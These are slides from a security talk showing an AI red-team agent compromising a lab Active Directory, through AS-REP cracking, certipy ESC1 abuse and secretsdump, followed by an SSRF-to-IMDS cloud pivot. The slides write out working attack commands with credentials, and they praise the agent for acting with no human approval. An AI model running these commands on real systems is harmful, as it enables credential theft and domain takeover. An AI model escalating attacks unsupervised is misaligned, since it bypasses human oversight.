<!-- Slide 44 from Harry's PPT — Ch5 Operation · STAGE 1 · hashcat 破解 -->

<div class="op-header">
<span>// OPERATION ATHENA-CRACK</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · CRACK</div>
<div class="slide-h1">hashcat 破解</div>
<div class="slide-sub">強密碼也擋不住離線爆破 — 關鍵在於不該讓 hash 流出。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  hashcat -m 18200  (Kerberos AS-REP)</div>

```bash
$ hashcat -m 18200 asrep.hash rockyou.txt

Status...........: Cracked
Recovered........: 1/1 (100.00%) Digests

$krb5asrep$...:  M0nk3y!B@n4n4#99
```

</div>

<div class="compare-2" style="margin-top: 1rem;">

<div class="side" style="border-left: 3px solid var(--accent-amber);">
<div class="head" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">▌ 線上攻擊</div>
<div class="body" style="font-size: 0.88rem;">
登入 KDC 試密碼<br/>
5 次失敗 → 帳號鎖定<br/>
速度受限於網路 + 鎖定政策
</div>
</div>

<div class="center"></div>

<div class="side red-border">
<div class="head" style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">▌ 離線攻擊（這次）</div>
<div class="body" style="font-size: 0.88rem;">
已有 AS-REP hash 在手<br/>
無限嘗試，沒有鎖定<br/>
速度只受 GPU 限制
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 45 from Harry's PPT — Ch5 Operation · STAGE 1 · ADCS ESC1 原理 -->

<div class="slide-eyebrow">STAGE 1 / DC-01 · PRINCIPLE</div>
<div class="slide-h1">ADCS ESC1 原理</div>
<div class="slide-sub">MITRE ATT&CK · T1649 · 整個過程合法走 ADCS API</div>

<div class="alert-box">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-amber); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ ENROLLEE_SUPPLIES_SUBJECT</div>
<div style="font-size: 0.95rem; line-height: 1.5;">
憑證模板允許申請者「自行指定」憑證的 SAN（Subject Alternative Name）— 你寫誰，CA 就把它簽進憑證裡。
</div>
</div>

<div class="kill-chain compact" style="margin: 1.4rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 8rem;">
<div class="label">1</div>
<div class="sub">legacy_kev 用破解出的密碼登入 AD</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 8rem;">
<div class="label">2</div>
<div class="sub">申請 VulnTemplate1<br/>UPN 填 da_alice@corp.athena.lab</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 8rem;">
<div class="label">3</div>
<div class="sub">CA 沒驗證身分<br/>→ 簽發 da_alice.pfx</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 46 from Harry's PPT — Ch5 Operation · STAGE 1 · certipy req → da_alice.pfx -->

<div class="op-header">
<span>// OPERATION ATHENA-CERT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1"><code>certipy req → da_alice.pfx</code></div>
<div class="slide-sub">整個過程合法走 ADCS API，CA 自己蓋章的。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  certipy-ad</div>

```bash
$ certipy req \
      -u legacy_kev@corp.athena.lab \
      -p 'M0nk3y!B@n4n4#99' \
      -ca CORP-CA -template VulnTemplate1 \
      -upn da_alice@corp.athena.lab

[*] Successfully requested certificate
[*] Saved certificate and private key to da_alice.pfx
```

</div>

<div class="bridge-bottom">
我們真的找到 ESC1 嗎？下一張用 <code>certipy find</code> 證明給你看 →
</div>

---
transition: fade
---

<!-- Slide 47 from Harry's PPT — Ch5 Operation · STAGE 1 · ESC1 三條件 -->

<div class="slide-eyebrow">STAGE 1 / ESC1-PROOF</div>
<div class="slide-h1">ADCS ESC1 — <code>certipy find</code> 三條件</div>
<div class="slide-sub">三條件 AND 即 ESC1 — <code>certipy find -vulnerable</code> 自動標出</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Enrollee Supplies Subject = True</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">模板 flag <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> — 申請者自填 SAN，CA 不驗證。這是設計選項，不是 bug。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">msPKI-Certificate-Name-Flag: 0x1 (ENROLLEE_SUPPLIES_SUBJECT)</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Client Authentication EKU</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">EKU 含 <code>1.3.6.1.5.5.7.3.2</code> → 簽出來的憑證可拿去 Kerberos PKINIT 換 TGT。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">pkiextendedkeyusage: Client Authentication</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Low-priv enroll 權限</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">Authenticated Users 或 Domain Users 有 Enroll ACE — 任何網域帳號都能申請。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">Enrollment Rights: CORP\Domain Users — Allow</div>
</div>
</div>

</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 48 from Harry's PPT — Ch5 Operation · STAGE 1 · certipy auth → da_alice TGT (DA reached) -->

<div class="op-header">
<span>// OPERATION ATHENA-DA</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1"><code>certipy auth → da_alice TGT</code> <span class="status elevated">ELEVATED</span></div>
<div class="slide-sub">**da_alice@corp** <span class="status elevated">ELEVATED</span> · ★ DOMAIN ADMIN</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node exploit"><div class="label">PFX</div><div class="sub">da_alice</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">PKINIT</div><div class="sub">via certipy</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">TGT</div><div class="sub">da_alice</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">★ DA</div><div class="sub">domain admin</div></div>
</div>

<div class="alert-box">
寫入 facts: <code>access.kerberos_ticket.da_alice</code> · NT hash dumped · 下一步 → ACCT-DB01
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DC-01</div>

```bash {1|2|3|4|5|6|7|all}
[21:08:12] ● PFX → TGT
[21:08:13]   certipy auth
[21:08:14]   -pfx da_alice.pfx
[21:08:21] ● TICKET    da_alice@corp
[21:08:22] ● ★ DOMAIN ADMIN
[21:08:23] ● fact saved access.kerberos_ticket
[21:08:24] ● NEXT      → STAGE 2
```

</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 49 from Harry's PPT — Ch5 Operation · STAGE 1 · DC-01 攻陷 (DA achieved) -->

<div class="op-header">
<span>// OPERATION ATHENA-DC-PWN</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · DONE</div>
<div class="slide-h1">DC-01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**DC-01** <span class="status compromised">COMPROMISED</span> · 2 credentials / 1 vulnerability</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">WEB01</div><div class="sub">RCE ✓</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">DC-01</div><div class="sub">DA ✓</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">next</div></div>
</div>

<div class="alert-box">
Kill chain: <code>T1558.004</code> → <code>T1110.002</code> → <code>T1649</code> · 三段全自動串接，無人類批准。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:09:47</div>

```bash {1|2|3|4|5|6|7|all}
[21:09:47] ● TARGET    DC-01 / 192.168.0.16
[21:09:47] ● KILL CHAIN
[21:09:47]   T1558.004 ↓
[21:09:47]   T1110.002 ↓
[21:09:47]   T1649
[21:09:47] ● GAINED    domain admin
[21:09:47] ● ★ COMPROMISED · Δ +8m14s
```

</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 50 from Harry's PPT — Ch5 Operation · STAGE 2 · ACCT-DB01 OBSERVE -->

<div class="op-header">
<span>// OPERATION ATHENA-PIVOT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · OBSERVE</div>
<div class="slide-h1">ACCT-DB01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**ACCT-DB01** <span class="status scanning">SCANNING</span> · 192.168.0.23 · MSSQL 14.0</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p 1433,445 192.168.0.23</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">port 1433 (MSSQL) / 445 (SMB) OPEN</span>
<span class="tag">found</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">DA 已在手 → 直接走 admin_share 取 hash</span>
<span class="tag">pivot</span>
</div>
</div>

<div class="alert-box">
Admin path: ✓ DA in 手 / ✓ SMB on 445 → secretsdump 計畫已成形。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · ACCT-DB01</div>

```bash {1|2|3|4|5|6|all}
[21:09:50] ● OODA      > OBSERVE
[21:09:53] ● PORT 1433 MSSQL
[21:09:53] ● PORT 445  SMB
[21:09:55] ● ADMIN PATH
[21:09:55]   ✓ DA in 手
[21:09:55]   ✓ SMB on 445
[21:09:56] ● → secretsdump
```

</div>
</div>

---
transition: fade
---

<!-- Slide 51 from Harry's PPT — Ch5 Operation · STAGE 2 · secretsdump 原理 -->

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · PRINCIPLE</div>
<div class="slide-h1"><code>secretsdump</code>：DA 想要什麼有什麼</div>
<div class="slide-sub">MITRE ATT&CK · T1003.003</div>

<div class="kill-chain compact" style="margin: 1.4rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 9rem;">
<div class="label">▌ ACCESS</div>
<div class="sub">DA 透過 SMB<br/>連到 ADMIN$ + IPC$<br/>（合法管理員權限）</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 9rem;">
<div class="label">▌ EXTRACT</div>
<div class="sub">讀取 SAM hive +<br/>LSA secrets +<br/>DPAPI master keys</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 9rem;">
<div class="label">▌ RESULT</div>
<div class="sub">本機帳號 NT hash<br/>+ 服務帳號明文密碼<br/>+ 機器帳號</div>
</div>

</div>

<div class="danger-box">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ 為何防火牆無感</div>
<div style="font-size: 1rem; line-height: 1.5;">
走 SMB 445。Windows 把它當作日常檔案分享流量，看不出是攻擊。
</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 52 from Harry's PPT — Ch5 Operation · STAGE 2 · secretsdump 輸出 -->

<div class="op-header">
<span>// OPERATION ATHENA-SECRETS</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · ACT</div>
<div class="slide-h1"><code>secretsdump</code> 輸出 <span class="status dumped">DUMPED</span></div>
<div class="slide-sub">服務帳號明文密碼也一起噴出來。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  impacket-ad:secretsdump</div>

```bash
$ secretsdump.py corp/da_alice@192.168.0.23 -k

[*] Service RemoteRegistry is in stopped state
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<LM_HASH>:<NTLM_HASH>
[*] Dumping cached domain logon information
[*] Dumping LSA Secrets
$MACHINE.ACC:<plaintext_secret>
mssql_svc:<plaintext_password>   ← 服務帳號明文
...[truncated]
```

</div>

<div class="alert-box">
寫入 facts: <code>access.local_admin · service.mssql_pass</code>
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DUMP</div>

```bash {1|2|3|4|5|6|7|all}
[21:11:08] ● TOOL      impacket-ad:secretsdump
[21:11:09] ● PROTO     SMB / 445
[21:12:43] ● DUMPED    SAM hashes
[21:12:43]            LSA secrets
[21:12:43]            service.mssql_pass
[21:12:44] ● fact saved access.local_admin
[21:12:45] ● NEXT      → MISSION
```

</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 53 from Harry's PPT — Ch5 Operation · STAGE 2 · ACCT-DB01 攻陷 (Mission Complete · War Room image2) -->

<div class="op-header">
<span>// OPERATION ATHENA-OODA-26</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · DONE</div>
<div class="slide-h1">ACCT-DB01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**ALL TARGETS** <span class="status compromised">COMPROMISED</span> · 全程 < 20 分鐘</div>

![War Room — OODA #26](/image2.png)

<div class="alert-box">
War Room timeline: WEB01 (Δ+7m27s) → DC-01 (Δ+8m14s) → ACCT-DB01 (Δ+4m12s) — OODA #26 全程可重播、可審計。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:14:02</div>

```bash {1|2|3|4|5|6|7|all}
[21:14:02] ● TARGET    ACCT-DB01
[21:14:02] ● GAINED    local admin
[21:14:02]            mssql sa
[21:14:02]            財務資料
[21:14:02] ──────────
[21:14:02] ● MISSION   COMPLETE
[21:14:02]   3 / 3 targets · 全自動執行
```

<div style="margin-top: 0.4rem; padding: 0 0.8rem 0.6rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; color: var(--accent-red); text-shadow: 0 0 8px var(--accent-red-glow);">
<strong>OODA ITERATIONS · #26</strong>
</div>

</div>
</div>

---
transition: fade
---

<!-- Slide 54 from Harry's PPT — Ch5 Operation · MISSION COMPLETE · 完全靠 AD 設定錯誤 + AI 自動串接 -->

<div class="slide-eyebrow">MISSION / COMPLETE</div>
<div class="slide-h1">Mission Complete</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 1rem; margin-top: 1.4rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--accent-green); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-green); line-height: 1;">20 min</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">全程耗時</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-red); line-height: 1;">3 / 3</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">靶機攻陷</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-amber); line-height: 1;">0</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">人工介入</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-blue); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-blue); line-height: 1;">100%</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">信心可解釋</div>
</div>

</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 1rem 1.2rem; margin-top: 1.4rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 0.9rem; margin-bottom: 0.6rem;">▌ KILL CHAIN</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-amber); font-size: 0.95rem; margin-bottom: 0.6rem;">
T1190 (RCE) → T1558.004 (AS-REP) → T1110.002 (offline crack) → T1649 (ADCS ESC1) → T1003.003 (secretsdump)
</div>
<div style="color: var(--fg); font-size: 1rem; line-height: 1.5;">
每一步都是 LLM 自行決定，根據前一步寫入 Facts DB 的事實。<br/>
沒有任何環節依賴密碼弱、依賴 0day、依賴運氣。
</div>
</div>

<div class="bridge-bottom" style="border-left-color: var(--accent-amber); background: rgba(240, 136, 62, 0.10);">
<strong style="color: var(--accent-amber);">完全靠 AD 設定錯誤 + AI 自動串接。</strong>
</div>

---
layout: cover
class: 'text-center'
---


<!--
Slide 1 — Hook / 接手 | 0:45 (0:00 - 0:45)

接續另一位講者「拿到 Domain Admin」的結尾，反轉敘事：
DA 不是終點，是入場券。

clicks:
  1: 「Domain Admin」變紅（前一段勝利）
  2: 「→ ?」浮現橘色（你接下來的問題）
-->

<div class="deco-squares tl"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>
<div class="deco-squares br"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>

<div class="slide-nine-chars">

<div class="bucket-row">
<span class="qualifier" :class="{ lit: $clicks >= 1 }">Domain Admin</span><span class="dim">&nbsp;&nbsp;</span><span class="vars" :class="{ lit: $clicks >= 2 }">→ ?</span>
</div>

<div class="annotations">

<div class="annotation" v-click="1">
<div class="dot red"></div>
<div>
<div class="label">Castle key acquired</div>
<div class="desc">End credits, in the classic narrative.</div>
</div>
</div>

<div class="annotation" v-click="2">
<div class="dot orange"></div>
<div>
<div class="label">Or just the boarding pass?</div>
<div class="desc">The next control plane is hybrid identity.</div>
</div>
</div>

</div>

</div>

---
transition: fade
---

<!--
Slide 2 — Terrain Shift | 1:00 (0:45 - 1:45)

讓觀眾意識到：DA 在 2026 現代企業 = 跨進雲端的入場券。
台灣多數中型以上企業跑 hybrid identity（Entra Connect / AD FS / PTA）。
DA 不會自動拿到雲端全控，但它常是通往雲端的起點。
-->

<div class="slide-eyebrow">Section A · Terrain Shift</div>
<div class="slide-h1">DA is not the summit — it's the bridge</div>
<div class="slide-sub">Hybrid identity is the modern enterprise default — DA touches it.</div>

<div class="compare-2" style="margin-top: 2rem;">

<div class="side green-border">
<div class="head">On-prem AD</div>
<div class="body">The world you just watched fall.<br/>Domain Admin = control of the machine room.</div>
</div>

<div class="center">↔</div>

<div class="side red-border">
<div class="head">Entra ID · Azure · M365</div>
<div class="body">Where the real assets live now.<br/>Customer data · executive mail · API keys · production secrets.</div>
</div>

</div>

<div class="bridge-bottom" style="margin-top: 2rem;">
<strong>Entra Connect / AD FS / PTA</strong> 是 hybrid identity 控制面 — DA 不等於雲端全控，但常是通往雲端的起點。
</div>

---
transition: fade
---

<!--
Slide 3 — C5ISR Extended | 1:30 (1:45 - 3:15)

延伸前段講者建立的 C5ISR 框架到雲端。
同一套指揮架構，戰場從機房延伸到雲端。
-->

<div class="slide-eyebrow">Section B · Command Extended</div>
<div class="slide-h1">Same command, different theatre</div>
<div class="slide-sub">The C5ISR framework you just saw — applied to the cloud front.</div>

<table class="matrix" style="margin-top: 1.6rem;">
<thead>
<tr>
<th style="width: 14%">Domain</th>
<th style="width: 43%">On-prem (what you just saw)</th>
<th style="width: 43%">Cloud (what comes next)</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ISR</strong></td>
<td>nmap · BloodHound · LDAP enum</td>
<td>IMDS · S3 enum · Graph API · CloudFox</td>
</tr>
<tr>
<td><strong>Computers</strong></td>
<td>IP · Hostname · Service</td>
<td>Cloud resource ID · Principal / role · Tenant / account ID</td>
</tr>
<tr>
<td><strong>Comms</strong></td>
<td>SSH · SMB · Kerberos · LDAP</td>
<td>Access token · Refresh token / PRT · SAS / API key</td>
</tr>
<tr>
<td><strong>Cyber</strong></td>
<td>Exploit · Lateral · Kerberoast</td>
<td>API abuse · IAM privesc · Token theft</td>
</tr>
</tbody>
</table>

<div class="bridge-bottom" style="margin-top: 1.6rem;">
對 AI 指揮官來說 — 這是<strong>同一場戰爭的不同前線</strong>。
</div>

---
transition: fade
zoom: 0.88
---

<!--
Slide 4 — Cloud OODA Tested | 2:00 (3:15 - 5:15) ⭐ 核心 1

flAWS.cloud Level 5 真實跑通的 log — Orient JSON 從 Athena log 撈出（rec_id 00e38a61, 2026-04-16）。
全場唯一可 fact-check 的真實證據。

開講節奏：
- 30s 鋪 kill-chain（nmap → SSRF → web_http_fetch → AWS cred）
- 60s 念 JSON：「Athena 看到三條路 — T1190 0.95, T1046 0.75, T1592.004 0.65」
- 30s 收尾："不是更快，是更聰明" — 0.95 自信值的決定

TODO（可選）：War Room timeline 截圖 — 但 deck 空間有限，目前 JSON 已是強證據。
-->

<div class="slide-eyebrow">From the Lab · flAWS.cloud · OPERATION CLOUDSTRIKE</div>
<div class="slide-h1">AI's first cloud decision</div>
<div class="slide-sub">Excerpt from Athena Orient log · <code>rec_id 00e38a61</code> · 2026-04-16 16:11Z</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">

<div class="kc-node recon">
<div class="label">nmap + web probe</div>
<div class="sub">discover /proxy/</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node recon">
<div class="label">SSRF probe</div>
<div class="sub">IMDS canary confirmed</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">web_http_fetch</div>
<div class="sub">via /proxy/ → IMDS</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">AWS credential</div>
<div class="sub">AccessKey · Secret · Token</div>
</div>

</div>

```json
{
  "rec_id": "00e38a61-0afe-407f",
  "ooda_iteration_id": "c3255b5e-bc3e-464d",
  "operation_id": "5d21782a (FLAWS-DEMO)",
  "timestamp": "2026-04-16T16:11:11.286Z",
  "tool": "web_http_fetch",
  "evidence_refs": ["web.vuln.ssrf", "cloud.aws.imds_role"],
  "situation_assessment": "TA0043 → TA0001. SSRF confirmed. IAM role 'flaws' enum'd. Per Rule #10, SSRF→IMDS pivot required.",
  "recommended_technique_id": "T1190",
  "confidence": 0.95,
  "options": [
    {"technique": "T1190", "confidence": 0.95},
    {"technique": "T1046", "confidence": 0.75},
    {"technique": "T1592.004", "confidence": 0.65}
  ],
  "reasoning": "Must complete IMDS cred extraction before T1078.004 or T1530."
}
```

<div class="alert-box" style="margin-top: 1rem;">
小兵看到三個選項都試一遍。指揮官看到 SSRF 確認 + IAM role 已 enum — 選 <span class="status elevated">0.95</span>，跳過 0.75 / 0.65。<strong>不是更快，是更聰明。</strong>
</div>

---
transition: fade
---

<!--
Slide 5 — Blast Radius | 1:30 (5:15 - 6:45) ⭐ 核心 2

從一個入口到全戰場 — 視覺化「核彈」當量。
-->

<div class="slide-eyebrow">Blast Radius</div>
<div class="slide-h1">One entry. Multiple theatres.</div>
<div class="slide-sub">His AD compromise. My SSRF. Different entries — same explosion.</div>

<div class="kill-chain compact" style="margin: 1.4rem 0; gap: 0.4rem;">

<div class="kc-node benign">
<div class="label">Initial breach</div>
<div class="sub">previous segment</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node recon">
<div class="label">AD foothold</div>
<div class="sub">on-prem domain</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">Domain Admin</div>
<div class="sub">machine room</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">Hybrid Identity</div>
<div class="sub">junction layer</div>
</div>

</div>

<div class="kill-chain compact" style="margin: 0.4rem 0; gap: 0.4rem;">

<div class="kc-node attacker">
<div class="label">Azure tenant</div>
<div class="sub">tenant takeover</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">M365 mailbox</div>
<div class="sub">executive mail</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">Key Vault</div>
<div class="sub">production secrets</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">Cross-cloud · supply chain</div>
<div class="sub">customer tenants</div>
</div>

</div>

<div class="danger-box" style="margin-top: 1.2rem;">
一個邊界漏洞的 blast radius 跨 <strong>AD、hybrid identity、Azure/M365、secrets、供應鏈</strong>。傳統 CVSS 算不出來這種當量。
</div>

---
transition: fade
---

<!--
Slide 6 — In the Wild | 1:00 (6:45 - 7:45)

證明這不是 lab 演練，是 2023-2025 真實發生的事。
-->

<div class="slide-eyebrow">In the Wild · 2023–2025</div>
<div class="slide-h1">Not a lab exercise — real threats</div>
<div class="slide-sub">Hybrid identity attacks observed in the wild.</div>

<div class="compare-2" style="grid-template-columns: 1fr 1fr 1fr; gap: 1.2rem; margin-top: 1.6rem;">

<div class="side red-border">
<div class="head">Storm-0558<br/><span style="font-size: 0.78rem; color: var(--fg-dim); font-weight: 400;">2023</span></div>
<div class="body">MSA signing key theft → forged tokens → cross-tenant mail access. Multiple government agencies impacted.</div>
</div>

<div class="side red-border">
<div class="head">Midnight Blizzard<br/><span style="font-size: 0.78rem; color: var(--fg-dim); font-weight: 400;">2024</span></div>
<div class="body">Legacy test tenant → Microsoft corporate email / source / internal systems. Customer-facing compromise not publicly evidenced.</div>
</div>

<div class="side red-border">
<div class="head">Volt Typhoon<br/><span style="font-size: 0.78rem; color: var(--fg-dim); font-weight: 400;">2024–25</span></div>
<div class="body">On-prem LOTL persistence in U.S./Guam critical infrastructure. Taiwan-conflict relevance assessed by CISA.</div>
</div>

</div>

<div class="alert-box" style="margin-top: 1.6rem;">
差別只在於 — 攻擊者用的是 Python script，還是 AI。<strong>而那個差距，正在縮小。</strong>
</div>

---
transition: fade
---

<!--
Slide 7 — Three Questions | 1:30 (7:45 - 9:15)

給防禦方三個 takeaway，呼應演講主題的戰略高度。
-->

<div class="slide-eyebrow">Three Questions</div>
<div class="slide-h1">Three questions for your next exercise</div>
<div class="slide-sub">If the answer is "no" — you're still using a toolbox, not a command system.</div>

<div class="numbered-lines" style="margin-top: 2rem;">

<div class="numbered-line">
<div class="n">1</div>
<div class="body">Can your red team see <strong>cloud + on-prem at once</strong>? Or two separate teams looking at half each?</div>
</div>

<div class="numbered-line">
<div class="n">2</div>
<div class="body">Does your SOC <strong>model credential and token paths across AD, Entra ID, M365, and cloud secrets</strong>?</div>
</div>

<div class="numbered-line">
<div class="n">3</div>
<div class="body">AI attacker speed. Does your <strong>incident response keep up</strong>?</div>
</div>

</div>

---
layout: cover
class: 'text-center'
---

<!--
Slide 8 — Closing | 0:45 (9:15 - 10:00)

英文 setup + 中文 kicker，最後一擊。
-->

<div style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 4rem;">

<div class="slide-eyebrow" style="margin-bottom: 2rem;">One Last Thing</div>

<div style="font-size: 2.2rem; font-weight: 700; line-height: 1.5; max-width: 52rem; text-align: center;">
From toolbox to command system —<br/>
the distance isn't <span style="color: var(--fg-dim);">tool progress</span>.
</div>

<div style="font-size: 2.6rem; font-weight: 700; line-height: 1.4; margin-top: 1.6rem; color: var(--accent-red);">
是視野的擴張。
</div>

</div>

---
transition: fade
---

<!-- Slide 55 from Harry's PPT — Ch6 · Lessons Learned (三個戰場心得) -->

